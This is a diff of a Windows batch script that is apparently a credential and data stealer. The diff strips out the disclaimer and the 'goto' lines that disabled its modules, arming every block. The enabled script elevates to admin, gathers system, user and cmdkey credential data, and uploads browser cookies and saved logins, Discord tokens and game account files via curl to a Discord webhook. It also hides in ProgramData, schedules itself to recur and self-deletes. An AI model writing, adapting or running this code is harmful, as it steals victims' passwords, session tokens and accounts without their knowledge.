@@ -1,127 +1,62 @@
 @echo off
-:: BY REMOVING THE GOTO(s) YOU AGREE TO NOT USE THE SCRIPT FOR MALICIOUS PURPOSES. THE AUTHOR IS NOT RESPONSIBLE FOR ANY HARM CAUSED BY THE SCRIPT.
-:: SOME GOTO(s) ARE NECESSARY, SO WATCH WHAT YOU REMOVE.
 
-goto remove_this_if_you_agree_to_follow_the_TOS
-
-:: Path of the hide location - If the path has the user's username, it will not work for those who have a space. Task Scheduler doesn't support that. This is part of the recurring method.
 set "vpath=C:\ProgramData"
 
 cd %vpath%
 
-:: If using onlogin on Task Scheduler use this - Might give away your file though - You don't need administrator for anything else currently.
-goto skipadministrator
 if not "%~dp0"=="%vpath%\" (
 	if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
 )
-:skipadministrator
 
 :: SET WEBHOOK | EDIT TO YOUR OWN WEBHOOK
-:: --------------------------------------
 set "webhook=https://discord.com/api/webhooks/"
 
-:: GET PRIVATE IP ADDRESS
-:: ----------------------
 for /f "delims=[] tokens=2" %%a in ('2^>NUL ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a
 
-:: GET PUBLIC IP ADDRESS
-:: ---------------------
 for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a
 
-:: GET TIME
-:: --------
 for /f "tokens=1-4 delims=/:." %%a in ("%TIME%") do (
 	set HH24=%%a
 	set MI=%%b
 )
 
-:: SEND FIRST REPORT MESSAGE WITH SOME INFO
-:: ----------------------------------------
 curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```[Report from %USERNAME% - %PublicIP%]\nLocal time: %HH24%:%MI%```\"}"  %webhook%
 
-:: SCREENSHOT - REMOVE GOTO IF YOU WANT TO TAKE A SCREENSHOT WHEN RUN
-:: ------------------------------------------------------------------
-goto skipscreenshot
-	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Screenshot @ %HH24%:%MI%```\"}"  %webhook%
-	set "ssurl=https://github.com/chuntaro/screenshot-cmd/blob/master/screenshot.exe?raw=true"
-	IF EXIST "s.exe" GOTO waitloop3
-	curl --silent -L --fail "%ssurl%" -o s.exe
-	>NUL attrib "%vpath%\s.exe" +h
-	:waitloop3
-	IF EXIST "s.exe" GOTO waitloopend3
-	timeout /t 5 /nobreak > NUL
-	:waitloopend3
-	2> NUL s.exe -wh 1e9060a -o s.png
-	curl --silent --output /dev/null -F ss=@"%vpath%\s.png" %webhook%
-	2>NUL del "%vpath%\s.png"
-:skipscreenshot
-
-:: SYSTEM INFORMATION - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
-:: ------------------------------------------------------------------
-goto skipsysteminfocapture
 	set "tempsys=%appdata%\sysinfo.txt"
 	2>NUL SystemInfo > "%tempsys%"
 	curl --silent --output /dev/null -F systeminfo=@"%tempsys%" %webhook%
 	del "%tempsys%" >nul 2>&1
-:skipsysteminfocapture
 
-:: TASK LIST - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
-:: ------------------------------------------------------------------
-goto skiptasklist
 	set "temptasklist=%appdata%\tasklist.txt"
 	2>NUL tasklist > "%temptasklist%"
 	curl --silent --output /dev/null -F tasks=@"%temptasklist%" %webhook%
 	del "%temptasklist%" >nul 2>&1
-:skiptasklist
 
-:: NET USER - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
-:: ------------------------------------------------------------------
-goto skipnetuser
 	set "netuser=%appdata%\netuser.txt"
 	2>NUL net user > "%netuser%"
 	curl --silent --output /dev/null -F tasks=@"%netuser%" %webhook%
 	del "%netuser%" >nul 2>&1
-:skipnetuser
 
-:: QUSER - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
-:: ------------------------------------------------------------------
-goto skipquser
 	set "quser=%appdata%\quser.txt"
 	2>NUL quser > "%quser%"
 	curl --silent --output /dev/null -F tasks=@"%quser%" %webhook%
 	del "%quser%" >nul 2>&1
-:skipquser
 
-:: STARTUP PROGRAMS - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
-:: ------------------------------------------------------------------
-goto skipstartupprograms
 	set "stup=%appdata%\stup.txt"
 	2>NUL reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run >> "%stup%"
 	curl --silent --output /dev/null -F tasks=@"%stup%" %webhook%
 	del "%stup%" >nul 2>&1
-:skipstartupprograms
 
-:: CMDKEY - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
-:: ------------------------------------------------------------------
-goto skipcmdkey
 	set "cmdkey=%appdata%\cmdkey.txt"
 	2>NUL cmdkey /list > "%cmdkey%"
 	curl --silent --output /dev/null -F tasks=@"%cmdkey%" %webhook%
 	del "%cmdkey%" >nul 2>&1
-:skipcmdkey
 
-:: IPCONFIG /ALL - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
-:: ------------------------------------------------------------------
-goto skipipconfig
 	set "ipconfig=%appdata%\ipconfig.txt"
 	2>NUL ipconfig /all > "%ipconfig%"
 	curl --silent --output /dev/null -F tasks=@"%ipconfig%" %webhook%
 	del "%ipconfig%" >nul 2>&1
-:skipipconfig
 
-:: CHROME - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
-:: ------------------------------------------------------
-goto skipchrome
 	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- CHROME -```\"}"  %webhook%
 	curl --silent --output /dev/null -F c=@"%localappdata%\Google\Chrome\User Data\Default\Cookies" %webhook%
 	curl --silent --output /dev/null -F h=@"%localappdata%\Google\Chrome\User Data\Default\History" %webhook%
@@ -133,11 +68,7 @@ goto skipchrome
 	curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Local State" %webhook%
 	
 	timeout /t 2 /nobreak > NUL
-:skipchrome
 
-:: OPERA - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
-:: -----------------------------------------------------
-goto skipopera
 	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- OPERA -```\"}"  %webhook%
 	curl --silent --output /dev/null -F c=@"%appdata%\Opera Software\Opera Stable\Cookies" %webhook%
 	curl --silent --output /dev/null -F h=@"%appdata%\Opera Software\Opera Stable\History" %webhook%
@@ -147,11 +78,7 @@ goto skipopera
 	curl --silent --output /dev/null -F l=@"%appdata%\Opera Software\Opera Stable\Login Data" %webhook%
 	
 	timeout /t 2 /nobreak > NUL
-:skipopera
 
-:: VIVALDI - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
-:: -------------------------------------------------------
-goto skipvivaldi
 	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- VIVALDI -```\"}"  %webhook%
 	curl --silent --output /dev/null -F c=@"%localappdata%\Vivaldi\User Data\Default\Cookies" %webhook%
 	curl --silent --output /dev/null -F h=@"%localappdata%\Vivaldi\User Data\Default\History" %webhook%
@@ -161,11 +88,7 @@ goto skipvivaldi
 	curl --silent --output /dev/null -F l=@"%localappdata%\Vivaldi\User Data\Default\Login Data" %webhook%
 	
 	timeout /t 2 /nobreak > NUL
-:skipvivaldi
-
-:: FIREFOX - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
-:: -------------------------------------------------------
-goto skipfirefox
+	
 	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- FIREFOX -```\"}"  %webhook%
 for /f %%f in ('2^>NUL dir /b "%appdata%\Mozilla\Firefox\Profiles"') do (
 	curl --silent --output /dev/null -F level=@"%appdata%\Mozilla\Firefox\Profiles\%%f\logins.json" %webhook%
@@ -177,18 +100,10 @@ for /f %%f in ('2^>NUL dir /b "%appdata%\Mozilla\Firefox\Profiles"') do (
 	timeout /t 2 /nobreak > NUL
 	)
 )
-:skipfirefox
 
-:: osu! - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
-:: ----------------------------------------------------
-goto skiposu
 	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- osu! -```\"}"  %webhook%
 	curl --silent --output /dev/null -F c=@"%localappdata%\osu!\osu!.%username%.cfg" %webhook%
-:skiposu
 
-:: DISCORD - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
-:: -------------------------------------------------------
-goto skipdiscord
 	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- DISCORD -```\"}"  %webhook%
 for /f %%f in ('2^>NUL dir /b "%appdata%\discord\Local Storage\leveldb\"') do (
 	echo %%f|find ".ldb"
@@ -198,11 +113,7 @@ for /f %%f in ('2^>NUL dir /b "%appdata%\discord\Local Storage\leveldb\"') do (
 		timeout /t 2 /nobreak > NUL
 	)
 )
-:skipdiscord
 
-:: STEAM - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
-:: -----------------------------------------------------
-goto skipsteam
 	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- STEAM -```\"}"  %webhook%
 	curl --silent --output /dev/null -F steamusers=@"C:\Program Files (x86)\Steam\config\loginusers.vdf" %webhook%
 	curl --silent --output /dev/null -F loginusers=@"C:\Program Files\Steam\config\loginusers.vdf" %webhook%
@@ -222,36 +133,20 @@ for /f %%s in ('2^>NUL dir /b "C:\Program Files\Steam\"') do (
 		timeout /t 2 /nobreak > NUL
 	)
 )
-:skipsteam
 
-:: MINECRAFT - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
-:: ---------------------------------------------------------
-goto skipminecraft
 	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- MINECRAFT -```\"}"  %webhook%
 	curl --silent --output /dev/null -F steamusers=@"%appdata%\.minecraft\launcher_profiles.json" %webhook%
 	curl --silent --output /dev/null -F steamusers=@"%appdata%\.minecraft\launcher_accounts.json" %webhook%
 	
 	timeout /t 2 /nobreak > NUL
-:skipminecraft
 
-:: GROWTOPIA - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
-:: ---------------------------------------------------------
-goto skipgrowtopia
 	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- GROWTOPIA -```\"}"  %webhook%
 	curl --silent --output /dev/null -F save.dat=@"%localappdata%\Growtopia\save.dat" %webhook%
 	
 	timeout /t 2 /nobreak > NUL
-:skipgrowtopia
-
-:: OTHER
-:: -----
 
 :: DO NOT EDIT
 set "recurring=false"
-
-:: RECURRING - REMOVE THE GOTO IF YOU WANT IT | MAKES TASK SCHEDULER OPEN THE FILE | UPDATER CAN BE ENABLED TO UPDATE THE BATCH | CAN TARGET USERS
-:: ----------------------------------------------------------------------------------------------------------------------------
-goto skiprecurring
 
 :: Change attributes to make editing files possible
 >NUL attrib -h "%vpath%\%uname%"
@@ -412,15 +307,8 @@ if errorlevel 0 (set "recurring=true, %when%") else (set "recurring=failed, %whe
 :: -------------------------
 curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Batch Scheduled: %recurring%\n[End of report]```\"}"  %webhook%
 
-:: SELF DELETE AFTER EXECUTION
-:: ---------------------------
-goto skipselfdelete
 if not "%~dp0"=="%vpath%\" (
 	call :d & exit /b
 	:d
 	start /b "" cmd /c 2^>NUL del "%~f0"&exit /b
 )
-:skipselfdelete
-
-:remove_this_if_you_agree_to_follow_the_TOS
-exit
